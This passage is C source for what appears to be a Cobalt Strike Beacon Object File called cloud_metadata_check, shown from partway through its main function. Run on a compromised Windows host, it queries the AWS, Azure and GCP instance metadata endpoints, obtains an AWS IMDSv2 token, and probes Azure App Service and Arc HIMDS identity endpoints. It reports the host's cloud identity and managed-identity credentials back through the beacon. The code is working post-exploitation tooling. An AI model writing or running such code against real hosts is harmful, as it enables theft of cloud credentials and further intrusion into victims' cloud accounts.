    char app_endpoint[APP_ENDPOINT_MAX];
    char app_secret[APP_SECRET_MAX];
    const char *arg = NULL;
    int arg_len = 0;
    int presence_only = 0;
    int reachable = 0;
    int appservice_ready = 0;
    int himds_reachable = 0;
    int aws_status = 0;
    int azure_status = 0;
    int gcp_status = 0;
    int is_aws = 0;
    int is_azure = 0;
    int is_gcp = 0;
    int aws_imds_mode = 0;
    const char *provider = "unknown";
    const char *aws_token_ptr = NULL;

    inline_memset(aws_token, 0, sizeof(aws_token));
    inline_memset(app_endpoint, 0, sizeof(app_endpoint));
    inline_memset(app_secret, 0, sizeof(app_secret));
    set_default_audience();

    if (alen > 0x7fffffffUL) {
        print_usage();
        return;
    }

    if (alen > 0) {
        BeaconDataParse(&parser, args, (int)alen);
        while (BeaconDataLength(&parser) > 0) {
            arg = BeaconDataExtract(&parser, &arg_len);
            if (!arg_has_content(arg, arg_len)) {
                continue;
            }

            if (arg_equals_literal_i(arg, arg_len, "presence")) {
                presence_only = 1;
                continue;
            }

            if (arg_equals_literal_i(arg, arg_len, "-aud")) {
                const char *aud_arg = NULL;
                const char *extra_arg = NULL;
                int aud_len = 0;
                int extra_len = 0;

                if (BeaconDataLength(&parser) <= 0) {
                    print_usage();
                    return;
                }

                aud_arg = BeaconDataExtract(&parser, &aud_len);
                if (!arg_has_content(aud_arg, aud_len)) {
                    print_usage();
                    return;
                }

                if (arg_equals_literal_i(aud_arg, aud_len, "other")) {
                    if (BeaconDataLength(&parser) <= 0) {
                        print_usage();
                        return;
                    }
                    extra_arg = BeaconDataExtract(&parser, &extra_len);
                    if (!arg_has_content(extra_arg, extra_len)) {
                        print_usage();
                        return;
                    }
                }

                if (!set_audience_from_arg(aud_arg, aud_len, extra_arg, extra_len)) {
                    print_usage();
                    return;
                }
                continue;
            }

            print_usage();
            return;
        }
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] cloud_metadata_check started\n");

    reachable = probe_imds_tcp();
    BeaconPrintf(CALLBACK_OUTPUT, "[i] imds_reachable: %s\n",
                 reachable ? "yes" : "no");

    appservice_ready = appservice_env_ready(app_endpoint, APP_ENDPOINT_MAX,
                                            app_secret, APP_SECRET_MAX);
    himds_reachable = probe_tcp_port("127.0.0.1", 40342);
    if (himds_reachable) {
        BeaconPrintf(CALLBACK_OUTPUT, "[i] himds_reachable: yes\n");
    }

    if (!reachable && !appservice_ready && !himds_reachable) {
        goto cleanup;
    }

    session = WINHTTP$WinHttpOpen(
        L"CustomBOFs/cloud_metadata_check",
        WINHTTP_ACCESS_TYPE_NO_PROXY,
        NULL, NULL, 0);
    if (!session) {
        BeaconPrintf(CALLBACK_ERROR, "[-] WinHttpOpen failed\n");
        goto cleanup;
    }
    WINHTTP$WinHttpSetTimeouts(session, 2000, 2000, 2000, 2000);

    if (reachable) {
        conn = WINHTTP$WinHttpConnect(session, L"169.254.169.254",
                                      (INTERNET_PORT)INTERNET_DEFAULT_HTTP_PORT, 0);
        if (!conn) {
            BeaconPrintf(CALLBACK_ERROR, "[-] WinHttpConnect failed\n");
        } else {
            aws_status = imds_http_status(conn, L"GET", L"/latest/meta-data/", NULL, NULL);
            if (aws_status == 200) {
                is_aws = 1;
                aws_imds_mode = 1;
            } else if (aws_status == 401) {
                if (aws_acquire_token(conn, aws_token, AWS_TOKEN_MAX)) {
                    aws_status = imds_http_status(conn, L"GET", L"/latest/meta-data/",
                                                  NULL, aws_token);
                    if (aws_status == 200) {
                        is_aws = 1;
                        aws_imds_mode = 2;
                    }
                }
            }

            azure_status = imds_http_status(conn, L"GET", AZURE_INSTANCE_PATH,
                L"Metadata: true\r\n", NULL);
            is_azure = (azure_status == 200);

            gcp_status = imds_http_status(conn, L"GET", L"/computeMetadata/v1/",
                L"Metadata-Flavor: Google\r\n", NULL);
            is_gcp = (gcp_status == 200);

            if (is_aws) {
                provider = "aws";
            } else if (is_azure) {
                provider = "azure";
            } else if (is_gcp) {
                provider = "gcp";
            } else {
                provider = "unknown";
            }

            BeaconPrintf(CALLBACK_OUTPUT, "[i] provider: %s\n", provider);

            if (is_aws) {
                BeaconPrintf(CALLBACK_OUTPUT, "[i] imds_mode: %s\n",
                             (aws_imds_mode == 2) ? "v2" : "v1");
                aws_token_ptr = (aws_imds_mode == 2) ? aws_token : NULL;
                aws_report_identity(conn, aws_token_ptr, presence_only);
                aws_report_context(conn, aws_token_ptr);
            } else if (is_azure) {
                azure_report_identity(conn, g_audience_resource,
                                      g_audience_label, presence_only);
                azure_report_context(conn);
                wireserver_report(session);
            } else if (is_gcp) {
                gcp_report_identity(conn, presence_only);
                gcp_report_context(conn);
            } else {
                BeaconPrintf(CALLBACK_OUTPUT,
                    "[i] probe_status: aws=%d azure=%d gcp=%d\n",
                    aws_status, azure_status, gcp_status);
            }

            WINHTTP$WinHttpCloseHandle(conn);
            conn = NULL;
        }
    }

    if (appservice_ready) {
        appservice_report_identity(session, app_endpoint, app_secret,
                                   g_audience_resource, g_audience_label,
                                   presence_only);
    }

    if (himds_reachable) {
        himds_report(session, g_audience_resource, g_audience_label,
                     presence_only);
    }

cleanup:
    if (conn) WINHTTP$WinHttpCloseHandle(conn);
    if (session) WINHTTP$WinHttpCloseHandle(session);
    inline_memset(aws_token, 0, sizeof(aws_token));
    inline_memset(app_endpoint, 0, sizeof(app_endpoint));
    inline_memset(app_secret, 0, sizeof(app_secret));
    clear_sensitive_state();
    BeaconPrintf(CALLBACK_OUTPUT, "[+] cloud_metadata_check complete\n");
}
